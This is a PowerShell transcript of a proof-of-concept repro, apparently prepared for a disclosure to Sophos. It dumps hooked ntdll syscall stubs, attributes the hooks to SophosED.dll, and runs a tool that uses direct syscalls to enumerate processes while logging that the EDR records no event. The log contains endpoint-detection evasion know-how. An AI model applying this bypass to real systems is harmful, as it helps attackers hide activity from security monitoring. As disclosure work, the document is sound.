@@ -1,0 +1,312 @@
+﻿**********************
+Début de la transcription Windows PowerShell
+Heure de début : 20260928115207
+Nom d'utilisateur : DESKTOP-QMMOFDV\0xKuraishY
+Utilisateur runAs :  DESKTOP-QMMOFDV\0xKuraishY
+Nom de la configuration : 
+Ordinateur : DESKTOP-QMMOFDV (Microsoft Windows NT 10.0.26200.0)
+Application hôte : C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File .\repro.ps1
+ID de processus : 13668
+PSVersion: 5.1.26100.9444
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.26100.9444
+BuildVersion: 10.0.26100.9444
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+
+==========================================================================
+  CHECK 1 - OS / ENVIRONMENT / REGISTERED AV
+==========================================================================
+Local time : 09/28/2026 11:52:08
+UTC time   : 09/28/2026 09:52:08
+Computer   : DESKTOP-QMMOFDV
+User       : 0xKuraishY  (normal user, admin NOT required)
+OS         : Microsoft Windows 11 Professionnel 64 bits (build 26200)
+Full build : 26200.9457
+AV product : Sophos Intercept X  (state 0x041000)
+AV product : Windows Defender  (state 0x060100)
+The environment state is also shown live at the start of the attached video (PoC.cleaned.mp4).
+
+==========================================================================
+  CHECK 2 - SOPHOS AGENT STATE
+==========================================================================
+
+Name                             Status
+----                             ------
+Sophos Endpoint Defense Service Running
+Sophos File Scanner Service     Running
+Sophos MCS Agent                Running
+Sophos MCS Client               Running
+Component versions (read from on-disk files, best effort):
+
+==========================================================================
+  CHECK 3 - NTDLL SYSCALL STUBS (16-byte dump, 6 functions)
+==========================================================================
+NtAllocateVirtualMemory      E9 03 F3 F6 BF 00 00 00   HOOK (E9 jmp)
+NtProtectVirtualMemory       E9 23 EA F6 BF 00 00 00   HOOK (E9 jmp)
+NtFreeVirtualMemory          E9 03 F3 F6 BF 00 00 00   HOOK (E9 jmp)
+NtClose                      E9 C3 F3 F6 BF CC CC CC   HOOK (E9 jmp)
+NtCreateThreadEx             4C 8B D1 B8 C9 00 00 00   intact (native prologue)
+NtQuerySystemInformation     4C 8B D1 B8 36 00 00 00   intact (native prologue)
+
+Expected: 4 x HOOK (E9 jmp) on the memory/handle APIs, 2 intact.
+A native Microsoft stub always starts with 4C 8B D1 B8 (mov r10,rcx ; mov eax,SSN).
+
+==========================================================================
+  CHECK 4 - HOOK ATTRIBUTION TRACE (which DLL filters the hook)
+==========================================================================
+stub  NtAllocateVirtualMemory : 140731635077296
+  E9 jmp -> trampoline page   : 140730560742328
+  (anonymous private executable page, ~1 GB below ntdll: atypical allocation)
+  FF 25 indirect jmp -> filter  : 140731582286480
+  filter code is INSIDE SophosED.dll + 0x158A90
+  => inline hook attribution: Sophos (SophosED.dll). Offset varies by agent version.
+
+==========================================================================
+  CHECK 5 - SOPHOSED.DLL INJECTION ACROSS PROCESSES
+==========================================================================
+SophosED.dll is loaded in 41 process(es) on this machine.
+The hooks are permanent surveillance injected into every process, not a reaction to the tool.
+
+==========================================================================
+  CHECK 6 - BINARY INTEGRITY (SHA256)
+==========================================================================
+activebreach.dll   SHA256 = 7D844D6CEE95032A64ADBAE773288A311BEC23BB0D1CF6C1CC4A831BAC677832
+  [PASS] activebreach.dll hash matches SHA256SUMS.txt
+abe_poc.exe        SHA256 = F1778677CA65056B8FAC4F78A309E85ADD7E7C13BA5527C9A666A378683B33A3
+  [PASS] abe_poc.exe hash matches SHA256SUMS.txt
+
+==========================================================================
+  CHECK 7 - LOCAL SOPHOS EVENT-LOG BASELINE (before the run)
+==========================================================================
+  (no Sophos event logs found)
+These record IDs are the baseline. After the PoC we count NEW events only.
+
+==========================================================================
+  CHECK 8 - POC RUN (bypassed init + direct syscall + data retrieval)
+==========================================================================
+Launching .\abe_poc.exe ...
+Stages: engine init under the 4 hooks -> direct syscall inside ntdll .text -> kernel answers.
+
+[*] Launching ActiveBreach...
+[AB:MAPPER][TID:13616] Opening C:\Windows\System32\ntdll.dll
+[AB:EXPORTS][TID:13616] SYSCALL_TABLE initialized @ 0x17f42e80000 (entries=488)
+[AB:EXPORTS][TID:13616] SYSCALL_TABLE set to READONLY
+[AB:EXPORTS][TID:13616] SYSCALL_TABLE hash = 0x17E627DBB9C53E22
+[+] activebreach_launch() returned: 0
+[*] Calling NtQuerySystemInformation via ABE...
+[AB:DISPATCH][TID:5640] dispatcher thread started @ 0x7ffe9856aca0 (TID=5640)
+[AB:DISPATCH][TID:5640] opframe initialized, ready flag set
+[AB:STUB][TID:5640] stub pool init: slots=33, stub_size=0x20, stride=0x4000
+[AB:STUB][TID:5640] stub pool range: 0x17F433F0000-0x17F4347001F (33 stubs)
+[AB:STUB][TID:5640] stub pool ready
+[AB:DISPATCH][TID:5640] [DISPATCH][L3] appel direct du prologue ntdll
+[+] SUCCESS! Syscall executed without detection.
+ReturnLength = 298480 bytes
+  [  0] System
+  [  1] Registry
+  [  2] smss.exe
+  [  3] csrss.exe
+  [  4] wininit.exe
+  [  5] services.exe
+  [  6] lsass.exe
+  [  7] fontdrvhost.exe
+  [  8] svchost.exe
+  [  9] svchost.exe
+  [ 10] svchost.exe
+  [ 11] svchost.exe
+  [ 12] svchost.exe
+  [ 13] svchost.exe
+  [ 14] svchost.exe
+  [ 15] svchost.exe
+  [ 16] svchost.exe
+  [ 17] svchost.exe
+  [ 18] svchost.exe
+  [ 19] svchost.exe
+  [ 20] svchost.exe
+  [ 21] svchost.exe
+  [ 22] svchost.exe
+  [ 23] svchost.exe
+  [ 24] svchost.exe
+  [ 25] svchost.exe
+  [ 26] SEDService.exe
+  [ 27] svchost.exe
+  [ 28] svchost.exe
+  [ 29] SSPService.exe
+  [ 30] svchost.exe
+  [ 31] svchost.exe
+  [ 32] hmpalert.exe
+  [ 33] svchost.exe
+  [ 34] svchost.exe
+  [ 35] svchost.exe
+  [ 36] svchost.exe
+  [ 37] svchost.exe
+  [ 38] svchost.exe
+  [ 39] Memory Compression
+  [ 40] svchost.exe
+  [ 41] svchost.exe
+  [ 42] svchost.exe
+  [ 43] svchost.exe
+  [ 44] svchost.exe
+  [ 45] svchost.exe
+  [ 46] svchost.exe
+  [ 47] spoolsv.exe
+  [ 48] svchost.exe
+  [ 49] svchost.exe
+  [ 50] svchost.exe
+  [ 51] svchost.exe
+  [ 52] svchost.exe
+  [ 53] svchost.exe
+  [ 54] svchost.exe
+  [ 55] blnsvr.exe
+  [ 56] svchost.exe
+  [ 57] svchost.exe
+  [ 58] svchost.exe
+  [ 59] svchost.exe
+  [ 60] MpDefenderCoreService.exe
+  [ 61] svchost.exe
+  [ 62] svchost.exe
+  [ 63] SophosNtpService.exe
+  [ 64] MsMpEng.exe
+  [ 65] svchost.exe
+  [ 66] SophosFS.exe
+  [ 67] svchost.exe
+  [ 68] WmiPrvSE.exe
+  [ 69] AggregatorHost.exe
+  [ 70] SophosNetFilter.exe
+  [ 71] svchost.exe
+  [ 72] svchost.exe
+  [ 73] WmiPrvSE.exe
+  [ 74] svchost.exe
+  [ 75] svchost.exe
+  [ 76] svchost.exe
+  [ 77] svchost.exe
+  [ 78] svchost.exe
+  [ 79] svchost.exe
+  [ 80] svchost.exe
+  [ 81] csrss.exe
+  [ 82] winlogon.exe
+  [ 83] svchost.exe
+  [ 84] svchost.exe
+  [ 85] fontdrvhost.exe
+  [ 86] dwm.exe
+  [ 87] SearchIndexer.exe
+  [ 88] svchost.exe
+  [ 89] DefenderSessionHelper.exe
+  [ 90] sihost.exe
+  [ 91] svchost.exe
+  [ 92] svchost.exe
+  [ 93] svchost.exe
+  [ 94] taskhostw.exe
+  [ 95] explorer.exe
+  [ 96] ShellHost.exe
+  [ 97] svchost.exe
+  [ 98] CrossDeviceResume.exe
+  [ 99] svchost.exe
+  [100] SearchHost.exe
+  [101] StartMenuExperienceHost.exe
+  [102] WidgetBoard.exe
+  [103] RuntimeBroker.exe
+  [104] svchost.exe
+  [105] ctfmon.exe
+  [106] msedgewebview2.exe
+  [107] msedgewebview2.exe
+  [108] msedgewebview2.exe
+  [109] msedgewebview2.exe
+  [110] msedgewebview2.exe
+  [111] msedgewebview2.exe
+  [112] SecurityHealthSystray.exe
+  [113] SecurityHealthService.exe
+  [114] Sophos UI.exe
+  [115] OneDrive.exe
+  [116] svchost.exe
+  [117] MicrosoftStartFeedProvider.exe
+  [118] svchost.exe
+  [119] WidgetService.exe
+  [120] FileCoAuth.exe
+  [121] taskhostw.exe
+  [122] ShellExperienceHost.exe
+  [123] RuntimeBroker.exe
+  [124] dllhost.exe
+  [125] dllhost.exe
+  [126] SophosMainUI.exe
+  [127] svchost.exe
+  [128] ApplicationFrameHost.exe
+  [129] svchost.exe
+  [130] WindowsTerminal.exe
+  [131] McsAgent.exe
+  [132] McsClient.exe
+  [133] svchost.exe
+  [134] SophosHealth.exe
+  [135] svchost.exe
+  [136] SophosFileScanner.exe
+  [137] SophosFileScanner.exe
+  [138] svchost.exe
+  [139] svchost.exe
+  [140] OneDrive.Sync.Service.exe
+  [141] OpenConsole.exe
+  [142] powershell.exe
+  [143] csrss.exe
+  [144] rdpclip.exe
+  [145] svchost.exe
+  [146] WUDFHost.exe
+  [147] winlogon.exe
+  [148] fontdrvhost.exe
+  [149] LogonUI.exe
+  [150] dwm.exe
+  [151] svchost.exe
+  [152] vctip.exe
+  [153] SearchProtocolHost.exe
+  [154] svchost.exe
+  [155] SearchFilterHost.exe
+  [156] smartscreen.exe
+  [157] powershell.exe
+  [158] WmiPrvSE.exe
+  [159] abe_poc.exe
+[+] 160 processes read via direct syscall.
+[*] POC finished.
+PoC started  : 28/09/2026 11:52:30
+PoC finished : 28/09/2026 11:52:38  (duration 9s)
+Exit code    : -1073741819 (0xC0000005)
+
+NOTE: exit code 0xC0000005 is EXPECTED here (documented in the report, section E.3).
+The syscall and its full response completed BEFORE this post-execution reaction.
+Please read the output above the exit line as the result, not the exit code.
+
+==========================================================================
+  CHECK 9 - POST-RUN: NEW EVENTS IN SOPHOS LOGS? (expect 0)
+==========================================================================
+
+TOTAL new Sophos local events during the run window: 0 (expected: 0)
+
+Local logs are only a proxy. The authoritative check is the console:
+  Sophos Central -> Devices -> this machine -> Events tab -> refresh.
+  Run window was 28/09/2026 11:52:30 - 28/09/2026 11:52:38. Confirm NO event exists for it. The attached video shows this exact check live at the end.
+The attached video PoC.cleaned.mp4 shows this console check live, single take.
+
+==========================================================================
+  SUMMARY OF AUTOMATIC CHECKS
+==========================================================================
+
+Check                                                              Pass Detail                                         
+-----                                                              ---- ------                                         
+OS build readable                                                  True 26200.9457                                     
+Sophos registered in SecurityCenter2                               True root\SecurityCenter2 query                     
+Sophos services running                                            True 4 service(s) running                           
+Expected hook layout (4 hooked + 2 intact)                         True 4 hooked of 6                                  
+Hook filter attributed to SophosED.dll                             True trampoline trace                               
+SophosED.dll present in processes                                  True 41 process(es)                                 
+Binaries present (and hashes verified if SHA256SUMS.txt exists)    True                                                
+Stage 1: init under hooks (SYSCALL_TABLE initialized, 488 entries) True 488 SSN table built despite hooks              
+Stage 2: SysCallX64 bypass ([L3] direct ntdll prologue call)       True syscall physically executes inside ntdll .text 
+Stage 3: kernel answered (SUCCESS + process list retrieved)        True NtQuerySystemInformation returned through th...
+No new events in local Sophos logs during the run                  True 0 new
+ALL AUTOMATIC CHECKS PASSED.
+Remaining manual step: confirm the Events tab in Sophos Central is empty for the run window.
+**********************
+Fin de la transcription Windows PowerShell
+Heure de fin : 20260928115239
+**********************
